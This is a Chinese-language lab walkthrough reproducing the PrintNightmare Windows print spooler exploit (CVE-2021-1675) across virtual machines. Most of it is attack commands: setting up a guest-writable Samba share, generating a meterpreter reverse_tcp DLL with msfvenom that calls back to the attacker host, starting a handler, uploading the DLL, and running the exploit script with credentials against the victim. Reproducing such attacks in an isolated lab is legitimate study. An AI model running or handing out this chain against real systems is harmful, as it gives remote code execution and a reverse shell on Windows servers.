# 0x02配置环境：

我们需要一台linux，配置可无密码访问的共享文件夹。

受害机：window2019（192.168.3.103）

服务机：Debian11（192.168.3.104）

攻击机：kali（192.168.3.102）

（环境全在虚拟机中执行）

下载下来漏洞POC，并且按照GitHub指导安装指定依赖。

![](../Images/ae79aa72a9ea0cd382f88d2be1254d71.png)

  

安装他的impacket

pip3 uninstall impacket

git clone https://github.com/cube0x0/impacket

cd impacket

python3 ./setup.py install

  

![](../Images/22d9d3168b9e90aa656c2df1e17e2cf6.png)

将Poc复制到Kali上

![](../Images/1afe644e97cef49ddb8f41191855d9ba.png)

另一台机器配置一下samba（Debian11）

![](../Images/43470894b9d12f08b55c55943e7246e6.png)

su

apt install samba

apt install samba-client

gedit /etc/samba/smb.conf

修改smb.conf的内容如下

\[global\]

map to guest = Bad User

server role = standalone server

usershare allow guests = yes

idmap config \* : backend = tdb

smb ports = 445

  

\[smb\]

comment = Samba

path = /tmp/

guest ok = yes

read only = no

browsable = yes

create mask = 0777

directory mask = 0775

guest ok = yes

  

打开Kali，生成木马并配置网络

msfvenom -p windows/x64/meterpreter/reverse\_tcp LHOST=192.168.3.102 LPORT=9999 -f dll -o y.dll

进入msfconsole

ØMsfconsole

Øhandler -p windows/x64/meterpreter/reverse\_tcp -H 192.168.3.102 -P 9999

![](../Images/0b694e9d26d1e4475873f75893150ead.png)

接着，上传恶意DLL文件到共享文件夹中（如果是Windows我们也可以通过手动的方式）

scp y.dll root@192.168.3.104:/tmp/

（上述操作需要开启SSH）

![](../Images/c94db8f7dbbd9a68501824b9b0ea307f.png)

上传y.dll到tmp目录

启动WindowsServer2019

![](../Images/ee3a065d7f93e8dbae038f0bee3443cd.png)

关闭防火墙

![](../Images/33231488639fa4a1a8c60cffe9e2511a.png)

开启Spooler服务

![](../Images/32752fc3bbcfa96d52329652872bfbd9.png)

  

  

python3 CVE-2021-1675.py Users/M:Moxin123..@192.168.3.103 “\\\\\\192.168.3.104\\smb\\y.dll”
